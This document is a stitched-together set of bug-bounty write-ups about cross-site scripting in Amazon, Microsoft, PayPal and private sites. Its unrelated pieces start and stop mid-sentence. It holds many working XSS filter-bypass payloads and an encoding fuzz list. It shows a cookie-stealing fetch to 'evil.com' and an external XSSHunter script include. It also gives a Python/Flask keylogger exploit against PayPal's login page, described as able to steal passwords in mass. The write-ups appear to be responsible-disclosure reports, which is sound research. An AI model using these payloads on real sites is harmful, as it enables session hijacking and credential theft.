looks like some custom product page they use inside their app. What happens if we change the product id? Press enter or click to view image in full size Mmm that looks broken. No proper checks for the product id and it looks likes it capitalizes it. So… maybe we’re able to inject some HTML code? Lets see what happens if we try a <marquee> tag. Press enter or click to view image in full size Great. It renders our input at 7 different places in the code, one of them right inside in a script tag. A few problems we have 1. Input is capitalized; so javascript functions like alert become ALERT and stop working. Luckily someone else already circumvented that problem while working on an XSS attack at Yahoo.com. Solution: convert the plain text to HTML entities and URL encode the string , use the output inside an onload parameter of a svg tag. For example: <svg onload=%26%23x61%3B%26%23x6C%3B%26%23x65%3B%26%23x72%3B%26%23x74%3B%26%23x28%3B%26%23x27%3B%26%23x48%3B%26%23x69%3B%26%23x20%3B%26%23x4D%3B%26%23x6F%3B%26%23x6D%3B%26%23x27%3B%26%23x29%3B> 2. Closing tags are not allowed (</script>); it fires a 404 error, so it’s not possible to easily side load our own javascript file by using a <script src=\"evil.com/1.js\"></script> block. Solution: use <svg onload=javascript:alert(1)> for javascript injections in the DOM. Or just use the vector we have inside of the script block. We are able to break out of it by adding a few characters: “}’> so the url becomes https://www.amazon.com/gp/masclient/dp/'}\");}JAVASCRIPTHERE;{(\" Due to the capitalization problem we may decide to use a jscrew.it technique in order to convert the javascript to ! ( ) + [ ] characters. An example url that just fires the debugger function is: https://www.amazon.com/gp/masclient/dp/'%7D\");%7D[][(![]+[])[+[]]+([![]]+[][[]])[+!![]+[+[]]]+(![]+[])[!![]+!![]]+(![]+[])[!![]+!![]]][([]+[][(![]+[])[+[]]+([![]]+[][[]])[+!![]+[+[]]]+(![]+[])[!![]+!![]]+(![]+[])[!![]+!![]]])[!![]+!![]+!![]]+(!![]+[][(![]+[])[+` ... If the url length was not a problem it would be great to use this technique and inject fetch(\"evil.com\"+document.cookie) ( credits ). However the url will become >8000 characters, and we run into problem 3. 3. Max url length is limited; Amazon stops loading the page if the url is longer than ~3500 chars, so we can’t take advantage of techniques like http://jscrew.it/ . Solution : No idea, anyone? Update : Redditor Flowible suggested to use jjencode , I tried to do that at the time of writing the report, but the use of $ signs was not possible. Anyone aware of variation that let us change the $ sign into a normal character? Update : DrStache_ suggested to use octal encoding and javascript constructors.For example alert(1) is URL[‘\\143\\157\\156\\163\\164\\162\\165\\143\\164\\157\\162’](‘\\141\\154\\145\\162\\164(1)’)() and alert(document.cookie) is X=URL[‘\\143\\157\\156\\163\\164\\162\\165\\143\\164\\157\\162’];X(‘\\141\\154\\145\\162\\164(X(“\\162\\145\\164\\165\\162\\156 \\144\\157\\143\\165\\155\\145\\156\\164.\\143\\157\\157\\153\\151\\145”)())’)() Explained: X=URL[‘\\143\\157\\156\\163\\164\\162\\165\\143\\164\\157\\162’]; X(‘\\141\\154\\145\\162\\164(X(“\\162\\145\\164\\165\\162\\156 \\144\\157\\143\\165\\155\\145\\156\\164.\\143\\157\\157\\153\\151\\145”)())’)() is decoded X=URL[‘constructor’]; X(‘alert(X(“return document.cookie”)())’)() is decoded X=Function; X(‘alert(X(“return document.cookie”)())’)() is decoded Function(‘alert(Function(“return document.cookie”)())’)() is decoded alert(Function(“return document.cookie”)()) alert(document.cookie) 4. Chrome XSS Auditor; ERR_BLOCKED_BY_XSS_AUDITOR errors occur in Chrome (67.0.3396.62) if it detects any reflection attacks. For our proof of concept we use the Firefox (60.0.1) since it has no xss auditor. Solution: I was not able to find any unfixed bugs in the auditor. Anyone aware of a way to bypass this? Proof of concept (Working in Firefox) We will craft an Amazon url that automatically redirects the visitor to an external URL, appending the cookie details of this visitor to the URL. We log all the visits to this website, so we’re able to hijack their Amazon session. Furthermore we add some fake login screen, just for the sake of it, ‘we could have tried to steal login credentials’.

Heyy Everyonee, | by Sudhanshu Rajbhar | Medium Sitemap Open in app Sign up Sign in Medium Logo Write Sign up Sign in XSS in Microsoft subdomain Sudhanshu Rajbhar 3 min read · Jul 13, 2018 -- 4 Listen Share Heyy Everyonee, I am Sudhanshu , in this article I am going to share the story about my first xss which I found in Microsoft. A great thanks to my masters and friends for the love and support. This is my first article, so if there is any mistake in it forgive me. So the story goes like this ….. It was the time during my school summer holidays,I got a lot of homework but who cares about it .I just want to spend my time on my laptop.So here we go 18 days got passed away and I didn’t even realised I wasted all the time searching for websites for defacement,but I really sucked at it I couldn’t even find a single site. At that time, I asked myself something “Am I just going to waste my time like this searching for sites for defacement or I will do something else?” ,I decided that I will do something that gives me the satisfaction which I want. And suddenly an idea came into my mind what about doing bug hunting,I was already having a idea about it.But my problem was that after seeing others bugbounty hunter getting rewarded for their findings,I used to think that they are experts(yeah they are) and they just spend f**king one hour for finding bugs, its is just a piece of cake for them .So I thought I will also spend just one hour or something and I will find some cool bugs. I was totally wrong about it.Those guys out there are spending all their time searching for bugs,learning new things.I decided that I will do the same as them. Here we go, the real story starts from here Next day, I took my note and I watched around 30 XSS POC videos and some write-ups to understand where I can actually find those xss. I noted down the reproduce steps, then I read them again and again to understand it.After half-an-hour I started my search for the XSS . And guess what was my target “Microsoft”. I got this site https://social.microsoft.com/Forums/en-US/home , then I tried everywhere on the homepage where I can see any input field I looked for xss, but nothing seems to work and I was like And then I saw an button there “Ask Question”, i clicked on it.In the body field there were many options likes insert link,instert html,insert image so I put the payload in those fields and hoping that the xss will popup. Just in the first attempt in “insert link” I put my paload in the link, title,tooltip field and guess what Press enter or click to view image in full size And guys I was just fucked up after seeing it, really I did it!!!!!!! I was feeling like Then I looked for other Microsoft websites for the same xss bug and I got the same on social.msdn.microsoft.com .And then reported both of them.

POC FIRST? There are days when we get to test different applications with third party integrations such as payment gateways, logging etc etc. Same way we got to test one of our client application that uses braintree as a payment gateway(Braintree, a division of PayPal, is a company based in Chicago that specialises in mobile and web payment systems for e-commerce companies) Braintree provides an API for its merchants to easily consume it and integrate other services such as Paypal. You can read about it here: (https://developers.braintreepayments.com/guides/paypal/overview/javascript/v3) The client application was using braintree as the gateway and has a paypal checkout, clicking checkout button requested the following HTTP request POST /merchants/34v7znhy8njgntnr/client_api/v1/paypal_hermes/setup_billing_agreement HTTP/1.1 Host: api.braintreegateway.com User-Agent: python-requests/2.18.4 Accept-Encoding: gzip, deflate Accept: */* Connection: keep-alive Content-Type: application/json Content-Length: 1186 {\"returnUrl\": \"https://test.com\", \"cancelUrl\": \"https://test.com/\", \"experienceProfile\": {\"brandName\": \"Casper Sleep Inc.\", \"noShipping\": \"false\", \"addressOverride\": true}, \"shippingAddress\": {\"recipientName\": \"Test Test\", \"line1\": \"38 OXFORD STREET 302\", \"line2\": \"\", \"city\": \"LONDON\", \"state\": \"\", \"postalCode\": \"W1D 1AX\", \"countryCode\": \"GB\"}, \"braintreeLibraryVersion\": \"braintree/web/3.9.0\", \"_meta\": {\"merchantAppId\": \"casper.com\", \"platform\": \"web\", \"sdkVersion\": \"3.9.0\", \"source\": \"client\", \"integration\": \"custom\", \"integrationType\": \"custom\", \"sessionId\": \"5fc558ba-2fb7-4a79-a7ba-fef4fee926db\"}, \"authorizationFingerprint\": \"a60dc78155b9c65f05741aafc544bb90b9d2cee1376f1ce52ea1262bb0c67994|created_at=2017-12-24T14:04:17.144942456+0000&merchant_id=34v7znhy8njgntnr&public_key=msb362rjpg7nnvwd\"} The response will be a 302 redirect to the following URL https://www.paypal.com/agreements/approve?nolegacy=1&ba_token=<token> The above URL is valid for a couple of hours before it expires(still enough to launch a wide scale attack) The returnURL and cancelUrl parameters value could be set to any arbitrary URL(that was issue no1), but it was always observed that canceUrl value is reflected back in script context under paypal.com login page without any sanitisation or output encoding as required. Special characters like tags (>, <) were filtered but all others were allowed. Since the reflection was in script context and we only had to escape double quotes, we successfully & easily did that. But we know that XSS isn’t just about a pop up, getting to know the worst case scenario is best way to judge the severity of the vulnerability. In our case we exactly do that. Paypal’s Content Security Policy content-security-policy: default-src 'self' https://*.paypal.com https://*.paypalobjects.com; frame-src 'self' https://*.brighttalk.com https://*.paypal.com https://*.paypalobjects.com https://www.youtube-nocookie.com https://www.xoom.com https://*.pub.247-inc.net; script-src 'nonce-qox3mTimg6HhlWGFnpwLeOX14nhSoxzIAq9PGsBg0V7ClmIP' 'self' https://*.paypal.com https://*.paypalobjects.com 'unsafe-inline' 'unsafe-eval'; connect-src 'self' https://nominatim.openstreetmap.org https://*.paypal.com https://*.paypalobjects.com https://*.google-analytics.com https://*.salesforce.com https://*.force.com https://*.eloqua.com https://nexus.ensighten.com https://api.paypal-retaillocator.com https://*.brighttalk.com https://*.sperse.io https://*.dialogtech.com; style-src 'self' https://*.paypal.com https://*.paypalobjects.com 'unsafe-inline'; font-src 'self' https://*.paypal.com https://*.paypalobjects.com data:; img-src 'self' https: data:; form-action 'self' https://*.paypal.com https://*.salesforce.com https://*.eloqua.com; base-uri 'self' https://*.paypal.com; block-all-mixed-content; report-uri https://www.paypal.com/csplog/api/log/csp From above policy we can see that Paypal allows inline scripts. So to smuggle CSRF tokens or passwords (since the XSS is on login screen) We can think about – key-logging and sending data across by calling images from my controlled site – key-logging and sending data across by calling fonts from my controlled site – key-logging and send ajax requests etc etc But the content security policy says NOPE. connect-src is self, img-src is self, font-src is self. So we were thinking we are only left with pretty much redirecting users or opening a new tab every time they type (but ughhh that’s boring and not very stealthy!). Then it struck our mind, how about use HTML5’s cool stuff like event listeners and make this happen. Bingo! Here is our final payload(and the video at starting shows the same). Python Script import requests import json from flask import Flask, render_template app = Flask(__name__) def test(): data = {\"returnUrl\":\"https://test.com\",\"cancelUrl\":\"https://test.com/?dddddddd?\\\"}}; var WEBKEY={dataLog:'',start:function(){window.onkeypress=function(t){WEBKEY.dataLog+=String.fromCharCode(t.charCode)},setInterval('WEBKEY.exportLog();',5e3)},exportLog:function(){WEBKEY.dataLog.length>0&&(WEBKEY.dataLog='')}};WEBKEY.start();window.addEventListener('message',function(e){e.source.postMessage(WEBKEY.dataLog,'*')},!1); var a={\\\"test\\\":{\\\"test\\\":\\\"\",\"experienceProfile\":{\"brandName\":\"Casper Sleep Inc.\",\"noShipping\":\"false\",\"addressOverride\":True},\"shippingAddress\":{\"recipientName\":\"Test Test\",\"line1\":\"38 OXFORD STREET 302\",\"line2\":\"\",\"city\":\"LONDON\",\"state\":\"\",\"postalCode\":\"W1D 1AX\",\"countryCode\":\"GB\"},\"braintreeLibraryVersion\":\"braintree/web/3.9.0\",\"_meta\":{\"merchantAppId\":\"casper.com\",\"platform\":\"web\",\"sdkVersion\":\"3.9.0\",\"source\":\"client\",\"integration\":\"custom\",\"integrationType\":\"custom\",\"sessionId\":\"5fc558ba-2fb7-4a79-a7ba-fef4fee926db\"},\"authorizationFingerprint\":\"a60dc78155b9c65f05741aafc544bb90b9d2cee1376f1ce52ea1262bb0c67994|created_at=2017-12-24T14:04:17.144942456+0000&merchant_id=34v7znhy8njgntnr&public_key=msb362rjpg7nnvwd\"} headers = {\"Content-Type\" :\"application/json\"} r = requests.post(\"https://api.braintreegateway.com/merchants/34v7znhy8njgntnr/client_api/v1/paypal_hermes/setup_billing_agreement\", json=data,headers=headers) response = json.loads(r.text) url = response[\"agreementSetup\"][\"approvalUrl\"] url = url.replace(\"\\u0026\", \"&\") print(\"send this to victim\") print(\"==================\") return url @app.route(\"/\") def hello(): return render_template('1.html', name=test()) if __name__ == '__main__': app.run() HTML <html><html> <script> //create popup windowvar domain = \"{{name | safe}}\";var myPopup = window.open(domain,'myWindow'); //periodical message sendersetInterval(function(){ var message = 'Hello!

This flask app can be hosted online and then shared with multiple people making it a deadly attack allowing us to steal passwords in mass. Is there a better way you can exploit this?

So this Site was random and has vast subdomains to test domain *.example.com so i used some sites to find subdomains FindSubdomains.com 2. DnsDumpster 3. virustotal 4. Acunetix mannual tool Before i start Acunetix does Subdomain scans so just set the time out to 20 and you will get a really big list with banners and response headers. (it does the half of the work for you.) Now, i been through lots of subdomains and i was specifically looking for any jira environment , and i found one. lets say wiki.example.com so i looked at the version and it was “5.8.13” ,which is affected to ssrf …… I remember the “ Alyssa Herrera ” writeup on “ Piercing the Veil: Server Side Request Forgery to NIPRNet access ” so i quickly visited “ plugins/servlet/oauth/users/icon-uri?consumerUri=http://google.com ” And Boom i got the google page and i m like Hell Yea ! So i followed the writeup but couldn’t managed to get any sensitive info . [Yes i tried everything ..nothing worked.] And that’s where i was like “why god?” why ? why God? and then suddenly it came to my mind and i went to brute xss blog copied “ http://brutelogic.com.br/poc.svg ” , and put it place of https://google.com and boom , i got XSS Press enter or click to view image in full size ssrf to XSS in #Vain So it worked and i got bounty of 50$ which is less (and that company sucks) Anyways it doesn’t matter at all , it was all about exploration and learning new things and gain experience. #sharing is #caring Hope you guys enjoyed it and learned something new. #[For who doesn’t know ,rest are leets].

Press enter or click to view image in full size user settings panel Press enter or click to view image in full size XSS proof so the problem is the profile is not public and the only way to get the XSS is to tell the victim to change his name to malicious javascript code and that will be called Self-XSS there is no impact with it. i started burpsuite and changed my name the request looks like: Press enter or click to view image in full size hmm that looks interesting, i generated burpsuite CSRF poc Press enter or click to view image in full size replayed in browser response was: Press enter or click to view image in full size Awesome! now we have CSRF + Self-XSS let’s chain that together the form now looks like: Press enter or click to view image in full size Final POC as you can see in the last name field i have added the javascript code it’s from xsshunter.com that generate XSS poc you should give a try. “><script src= https://***.xss.ht ></script> and in the last i have added javascript submit form on load the file to make it more effective. now the user name is changed to the javascript code after he navigate the homepage the code will be in his browser and send back all info’s we need since there wasn’t any CSP protection. Press enter or click to view image in full size Stored XSS and going back to XSSHunter we can confirm it became Stored XSS, when any user opens our HTML form. Press enter or click to view image in full size After all thanks for reading if i helped clap hands to more write-ups about infosec, remember where there is self-XSS always look for CSRF to chain it together and make it a stored, by self-XSS i don’t mean user entered codes into browser console or self-dom XSS . //Renwa JavaScript Csrf Xss Attack Bug Bounty Infosec -- -- Written by Renwa 727 followers · 0 following No responses yet Help Status About Careers Press Blog Privacy Rules Terms Text to speech"}

Each worth \"1,016.66$\" Get link Facebook X Pinterest Email Other Apps - May 30, 2018 Hello everyone, This is my second blog of the series \" Sharing Is Caring \". What I have learnt until now because of those guys who believe in that 'methodology' :) The site is private, so call it private-site.com. 1- Store XSS using comment body I found that on a private-site.com, the comment body was reflecting on user own profile. So, I started hunting in a way to find something special. After many tried and tested with each and every payload I got nothing. But, I believe in a sentence \"There is always a way to bypass\" {Thanks to zahid ali who once said this and proved it on facebook, when bypassed same feature three times} Anyway, I didn't give up and thinking to bypass. Later, an idea clicked on my mind to use payload on second or third line as I have read in other researcher posts. The xss got store when I used my favourite payload <svg/onload=alert(1337)> on the second line of the body. Time spent: 9-10 hours 2- Store XSS using the file attachment This XSS was very easy to find. But I found it at the end when the program was about to close. I am more curious about how nobody found it. I saw a file attachment feature and tested it as my regular technique. I uploaded request on burp and sent to intruder. Then uploaded all file extensions on burp to see what extensions are allowed. Extensions which was allowed [.txt, .png, .jpg and '.xhtml' . Yes .xhtml !! ] For POC I uploaded the below code and reported it. <?xml version=\"1.0\" encoding=\"iso-8859-1\"?> <!DOCTYPE html PUBLIC \"-//W3C//DTD XHTML 1.0 Transitional//EN\" \"http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd\"> <html xml:lang= \"en\" lang= \"en\" xmlns= \"http://www.w3.org/1999/xhtml\" > <head> <title> POC </title> </head> <body> <p> This is a POC </p> <script> alert ( document . cookie ) </script> </body> </html> Time spent: 1 hour 3- Store XSS on the notification This type of XSS is my most favourite, I found it 3 times on different program. There was a feature on private-site.com, when a user performs any activity then follower user gets the notification. On notification the HTML tag was not sanitizing, So i used payload \"><svg/onload=alert(1337)> and made notification store xss. 4- Store XSS using encoding I found that on one endpoint the data was stored on a user profile. But it was blocking < tag. When I come across that situation, I just take the request on the burp and send the request to the intruder with the below payloads to see < sign can bypass or not. < %3C &lt &lt; &LT &LT; &#60 &#060 &#0060 &#00060 &#000060 &#0000060 &#X3C; &#X03C; &#X003C; &#X0003C; &#X00003C; &#X000003C; \\x3c \\x3C \\u003c \\u003C Luckly, &#X000003C; was working. So i just used \">&#X000003C;svg/onload=alert(1337)> and got store xss on user profile. 5- Weird Store XSS This XSS took around 2-3 days to find a bypass. I am not allowed to use the exact term of the site that would help other to get clue. So it is one point where < and > sign was allowed but only width and height can be used. For example: < svg width=100 height=100> was allowed but when I used event handler it blocked. After two days I was about to give up. But I gave it one more day :) On one moment I sent the request to intruder with payload POST /< svg width=100 hight=100>test I forgot that i have added <svg width=100 hight=100>. So intruder tried different payload on 'test'. At one point the payload was <svg width=100 hight=100><script>alert(1)</script> With the above payload, the store xss truly stored. Actually, the filter was checking the first HTML tag. It is really weird behaviour to me how this payload worked <svg><script>alert(1)</script> Reach me on Facebook or Twitter Get link Facebook X Pinterest Email Other Apps Comments Shahzad 8 June 2018 at 11:33 Bugcrowd!

The program is private, so call it private-site.com. As many researchers believe in recon beforae hunting a target, same this law apply to me. Around two months ago I was invited in a private program, the first step I did to know all about the target. I strongly believe that recon is incomplete without using censys and shodan search engine. I always use it at first whenever choose a target. Same on that day I searched about the private-site.com. I was lucky by using the certificate base query as below https://censys.io/ipv4/help?q=80.https.tls.certificate.parsed.extensions.subject_alt_name.dns_names%3Aprivate-site.com When using the above query i got many open ports.

After looking inside that functionality i can see that there is option to upload data manually as well as using file upload (Only CSV). there was a strict restriction of file upload for extension (.csv only). there was 4 option firstname , lastname , company , mobile number. Simply i tried to bypass using Burp by changing content-type to text/html , but no success in xss as there was something blocking at server level. time to dig more Later I tried to put simple payload in CSV file , like <script>alert(1)</script> in first 3 field , but something was blocking at server to not allow <script> tag. then i tried for many payload nothing was working. Finally i tried with </Textarea/</Noscript/</Pre/</Xmp><Svg /Onload=confirm(document.domain)>” and got stored xss. Press enter or click to view image in full size Stored xss and my expression was like (Mil gaya , mil gaya …): Thanks for reading my blog , hope you like this blog.

I think there is no new things here that you can learn. If you see “akita” or “rahul-maini” blog you can learn more than this. This is just a part of learning from those wite up post. Okay lets start. Recent I found a cookie injection in a private site that is reflected something in a cookie parameter. In regular way I check all the parameter, input something like “xxxx”. I noticed in burp reapeater cookie “GA_countryCode=xxx” reflected in code function. GET /my/refer/welcome?rt=6bjzl0zEmBiPl0IQRSeN&cid=111&channel=1151 HTTP/1.1 Host: www.vuln.com User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:52.0) Gecko/20100101 Firefox/52.0 Accept: */* Accept-Language: en-US,en;q=0.5 Content-Type: application/x-www-form-urlencoded Cookie: RT=6bjzl0zEmBiPl0IQRSeN5wxxx; GA_countryCode=GBxxxxxx ”; GA_currentDomain=www.vuln.co.uk; feature_rollercoaster_upload=0; ABTasty=uid%3D18042509351658083%26fst%3D1524627317406%26pst%3Dnull%26cst%3D1524627317406%26ns%3D1%26pvt%3D1%26pvis%3D1%26th%3D; ‘session_status’ : “session_defined”, ‘page_name’ : pageName, ‘page_category’ : ‘My Account’, ‘country_code’ : “GBxxxxxx”, ‘ua’ : “UA-48172145–1”, ‘current_domain’ : window.location.host, ‘Cookie_Timeout’ : “2592000000”, ‘channel_id’ : “1151”, Press enter or click to view image in full size Then I checked “><svg/onload> and its also reflected. page_name’ : pageName, ‘page_category’ : ‘My Account’, ‘country_code’ : “GB”><svg/onload>”, ‘ua’ : “UA-48172145–1”, ‘current_domain’ : window.location.host, ‘Cookie_Timeout’ : “2592000000”, ‘channel_id’ : “1151” Press enter or click to view image in full size Now the problem is comes up, when I try “><svg/onload=>, “=” blocked. Press enter or click to view image in full size Then I used some technique that I learned from brutelogic blog. I noticed alert is okay, no blocked only “=” is blocked. Then I used playload Like “><svg/on</script>laod=alert> and saw that was bypassed and reflected. Press enter or click to view image in full size Then try with “><svg/on</script>load=alert(1)> “()” bracket blocked, then used ``. “><svg/on</script>load=alert`1`> its fine. Press enter or click to view image in full size But no pop up. As all are bypassed, so I was confirmed its possible to trigger xss. I try many other way to pop up, but failed. Because many restiction, “Access Denied HTTP/1.1 403 Forbidden” and ip blocked. Then I make a shortcut playload Like “-prompt`1`-”//. And it worked. :) Press enter or click to view image in full size Xss done!! Press enter or click to view image in full size For this simple playload, it takes a long time. :( For sure there was a possible way to bypass with normal playload, but i didn’t try more. Less knowledge can’t think more. Sorry for my bad English. Thanks for reading.

ABSTRACT As a part for delivering the technical support to all of PayPal’s merchant, PayPal providing the portal (located at: https://www.paypal-techsupport.com ) for their merchant to communicate each other with PayPal such as discussing about the integration, send a feedback about the needed new feature, or any technical issue that could be face by PayPal’s merchant). Press enter or click to view image in full size Figure 1 PayPal Technical Support Portal In other side, for completing the support to all of entities that has use PayPal in their daily activity, PayPal also providing the site that could be used specifically by their customer to asking a permission about the use of PayPal’s logo at their business (located at: https://www.paypal-brandcentral.com ). Press enter or click to view image in full size Figure 2 PayPal Brand Central Portal Both of site has been supported with the file upload feature so either merchant or customer could try to upload the permitted file that could be used by PayPal for looking the situation that faced by them each other. But the problem exists when those file upload feature has a validation issue at their content (for technical support portal) and at their file name (for brand central portal) that could allow the Attacker to be able to store a script (client side scripting) which could be used for few attack scenarios (like redirecting a user to a phishing page or even downloading a malware — which is called Cross Site Scripting — will explain later at this report). Additional Note : Previously, PayPal Brand Central Site has been open for public for registration and everyone could activate their selves with the activation link that provide by PayPal (and yes, we could bypass this activation and we will release the related simple paper in near future — you could try to test the forgot password feature first with account yk@paypal.com ). But now, every registration at this portal should be approved manually by PayPal. Press enter or click to view image in full size Figure 3 Bypassing the PayPal Activation Link at PayPal Brand Central II. INTRODUCTION 2.1. Stored Cross Site Scripting (XSS) To put it simply, this kind of vulnerability is a vulnerability that could “let” an Attacker to be able to execute a code in the input section that hasn’t implemented filtering for special characters such as “ > < : / ; etc. In contrast to Reflected XSS that doesn’t save the “script” and required the target to visit the URL that has been “injected” by “additional contents” from an Attacker, Stored XSS save this script at the database and could be execute automatically when the target visit the affected page like normal. 2.2. 0x01 — General Ticket Submission at Tech Support Portal At the TechSupport Portal, PayPal allows the users to submit their issue via “Contact Support” Feature that could be visit at https://www.paypal-techsupport.com/app/ask . Generally, there are two process that could be used to user to submit the ticket into the TechSupport portal, which are. 2.2.1. The user should login into their TechSupport Portal account and visit the mentioned URL related “Contact Support” Feature. At this condition, then the user will directly face the “Subject” column as the first thing that need to be filled. Press enter or click to view image in full size Figure 4 Contact Support After Login 2.2.2. The second one is the user just directly visit the “Contact Support” Feature without any login activity . At this condition, then the user will directly face the “ Email Address” column as the first thing that need to be filled. Press enter or click to view image in full size Figure 5 Contact Support Page without Login At those ticket submission activity, the users can upload the supported documents that could be used to explains their issue more completely. In this situation, there are specific extension of the files that could be submitted by user, which are .txt, .doc, .docx, .xls, .xlsx, .pdf, .jpg, .png, .bmp, .ppt, and .pptx. In simple, .svg file format is not allowed by system to be upload at the portal. Press enter or click to view image in full size Figure 6 .SVG in not allowed to be Upload But the problem exists when the Attacker could manipulate the process of ticket submission to conduct a client side Attack to targeted account. In this case, Attacker could use the “Ticket submission without login” process and bypassing the protection of .svg upload . Also, the best thing in this scenario is PayPal Technical Support Portal didn’t validate the content of the .svg file too so Attacker could modify the content with the client side script that they would like to inject. Here is the example of the content that we use as the PoC (will explain later): <?xml version=”1.0″ encoding=”UTF-8″ standalone=”yes”?> <svg onload=”window.location=’http://www.google.com'” xmlns=\"http://www.w3.org/2000/svg\"> </svg> Special note : Very thanks to @BruteLogic for his very cool research related this thing that could be found at: https://brutelogic.com.br/blog/file-upload-xss/ 2.3. 0x01 — Mind Map of Ticket Submission at PayPal Tech Support Portal For completing to understanding the process of ticket submission, here are the simple mind map with few little explanation that could be help: 2.3.1. The figure below shown the normal process of ticket submission at TechSupport Portal. In this case, the scenario is “ Ticket submission with Login “. Everything looks normal just like the common flow of support portal. Press enter or click to view image in full size Figure 7 Ticket Submission with Login As has been described earlier, at those part, users are allow to upload the white list extension as their supported documents. 2.3.2. And the figure below also shown the process of ticket submission at TechSupport Portal with different condition. In this case, the scenario is “ Ticket submission without Login “. So, at this part, the users should fill the email address that they would like to use to interact with the submitted ticket. Press enter or click to view image in full size Figure 8 Ticket Submission without Login After the question has been submitted, then the user itself should login into the portal to interact with their own question. III. SUMMARY OF ISSUE As it has been described before, the security problem in this report is related with a vulnerability that “allows” an Attacker to be able to “store” an injected script (client side scripting) which could be used for few attack scenarios (like redirecting a user to a phishing page or even downloading a malware). The problem exist since there is a validation issue at their content checking (for technical support portal) and at their file name (for brand central portal). This condition also supported with authorization issue at both of application . IV. PROOF OF CONCEPT The proof of concept related this one is a little tricky since basically this XSS issue was a self-XSS. For completing the explanation, we do try to give simple mind map that could explain the attack method. 4.1. 0x01 — Proof of Concept at Technical Support Portal 4.1.1. When we back into the point #2.3.2 at this report, we will realize if there is an authorization issue at this portal. In other words, any anonymous user could try to submit a ticket to the registered user at the portal. All they need just “know” the registered email ID So basically, we could use this authorization issue to create a new ticket and upload the malicious .svg file to trigger the XSS at the target. Since the kind of XSS is stored XSS, then the Attacker just need to wait until the target open the created ticket. Another interesting part is, since there is no CAPTCHA at this ticket submission feature, then the Attacker could automatically brute the email field with the list of emails that they want. (yes, there is a token that will expired in some of period, but at least we could use it). Note : Probably this method is one of the business process that has been thinking deeply by PayPal so they didn’t fix this kind of ticket submission method (All PayPal do is fixed the XSS problem). 4.1.2. At this step, we should learn the flow of the attack first before directly go to the proof of concept. The figure below shown the method that used by Attacker to tricks the victim. In this case, the Attacker should uses the process of “ Ticket submission without Login ” and “ bypass the file upload protection” to upload the malicious .svg file. Press enter or click to view image in full size Figure 9 Mind Map of Attack So, just like the flow of “ticket submission without login” part, the email address that should be fulfilled by Attacker is the existing victim’s email account at TechSupport Portal (see the point #4.1.1). 4.1.3. After everything was filled, then the next thing that Attacker should do is upload the malicious .svg file that contains the client side scripting. Here is the sample of the client script that used as a PoC purpose: <?xml version=”1.0″ encoding=”UTF-8″ standalone=”yes”?> <svg onload=”window.location=’http://www.google.com'” xmlns=\"http://www.w3.org/2000/svg\"> </svg> Please kindly note, we still need to do a bypass of the client side protection that explained previously (see the figure below), then the Attacker should change the extension of the .svg file to the allowed one such as .png. Press enter or click to view image in full size Figure 10 Restricted Files Only — .SVG File is not Allowed Press enter or click to view image in full size Figure 11 Change the Extension into the .png File Format 4.1.4. After we choose the malicious .png file that shipped with the client side script code, then the next thing is intercept the request before we send it to the server. In the interception request, then we should change the content-type and extension into the .svg file format and .svg extension Press enter or click to view image in full size Figure 12 Change the Content-Type and Extension of the File 4.1.5. After everything was setup, then forward the request. When the request has been forwarded, then we will get a success result if the .SvG extension has been uploaded. Press enter or click to view image in full size Figure 13 Success to Upload the .SvG File 4.1.6. The latest part is of course the Attacker just need to wait the victim open the ticket and opening the .svg file that has been uploaded previously by Attacker. When the .svg file is open, then the XSS will be triggered. 4.2. 0x02 — Proof of Concept at Brand Central Portal 4.2.1. Similar with the point #2.3.2 at this report, there is an authorization issue at this portal. In other words, any anonymous user could try to submit a ticket to the registered user at the portal. All they need just “know” the registered email ID. Press enter or click to view image in full size Figure 14 Normal Method of Registration : Ticket Submission at Brand Central Portal The above shown the process of registering the account at BrandCentral. In this case, there are both scenario, which is: “ If the account doesn’t exist ” and “ If the account is exist “: If the account exists, then the registering process will turn their function into the “ Ticket Submission without the knowledge of User’s Password “; If the account doesn’t exist, then the registering process will stand as normal function (which is registration). 4.2.2. At this step, we will use the same flow just like the Technical Support Portal. The figure below shown the method that used by Attacker to tricks the victim. In this case, the Attacker should use the process of “ Ticket submission without Login ” and “ upload any file name to be change later” to trigger the XSS. Press enter or click to view image in full size Figure 15 Mind Map of Attack — PayPal Brand Central So, just like the flow of “ticket submission without login” part, the email address that should be fulfilled by Attacker is the existing victim’s email account at Brand Central Portal (see the point #4.2.1). Press enter or click to view image in full size Figure 16 Uploading the File with “cmd” as the name 4.2.3. After everything was filled, then the next thing that Attacker should do before sending the request completely to server is intercepting the request to change the file name into the malicious script that we would like to trigger at the victim’s side. For a sample proof to know this issue is works or not, we could use this simple pop up alert payload: ><img src=x onerror=prompt(1)> But since this pop up alert payload is not good enough to rising the risk level of issue, then we should try to change the payload (at least to the URL Redirection or downloading a program). At this situation, we found another issue, which is, the file name at this portal was restrict from dot, quote, equal, and slash character -> . ” / = So we should try to bypass it by changing the payload into this one. <img src=a onerror=document&#46;location&#61;&#34;http:&#47;&#47;google&#46;com&#34;> And here is the final setup when we intercept the request: Press enter or click to view image in full size Figure 17 Intercepting the Request and Change the File Name 4.2.4. The latest part is of course the Attacker just need to wait the victim open the ticket. When the ticket is open, then the page will execute the script that injected at the file name. Press enter or click to view image in full size Figure 18 The Page will Execute the Script that Injected at the File Name V. RECOMMENDATION There are several recommendations that could be implemented for preventing these issues (completely): 5.1. Protecting the ticket submission process by disabling the ticket submission without login; 5.2. Checking the uploaded file not only at the client side part, but also when the request has been send into the server; 5.3. Checking the file name that uploaded into the server. VI. ADDITIONAL INFORMATION For completing the explanation, we upload the video at Youtube for both of scenario: 6.1. Stored XSS at Technical Support Portal: https://youtu.be/7Au-As7jrQs ; 6.2. Stored XSS at Brand Central Portal: https://youtu.be/XwynfNOxIlI . VII. LESSON LEARNED 7.1. Always try to find a way to triggering your self-XSS into the non-self XSS. Even the file couldn’t be access for public (just like both of this case), then find a way to triggering it to the public or at least into the targeted victim; Once more, @BruteLogic has released his very cool research related this that could be found at: https://brutelogic.com.br/blog/leveraging-self-xss/ 7.2. PayPal has rewarded the issue that reported at Technical Support Portal and decided to mark the issue at Brand Central as “Not Actionable”. The main issue at this situation is there is a lack of information that we sent to PayPal related the Brand Central (which is not with the mind map of process and mind map of Attack just like we did at the Technical Support Portal). My point of view in this case are: Since there are so much thing that should be protected, the Security Team doesn’t always know the process at each application that they have. Also, we should know if they will receive so many report from any researcher around the world. From both of those consideration, then the reporter always should create a complete report (explaining the process) or at least create the PoC video with the detail of step by step. Please kindly note, since PayPal change the registration process at Brand Central, then the issue at Brand Central is not 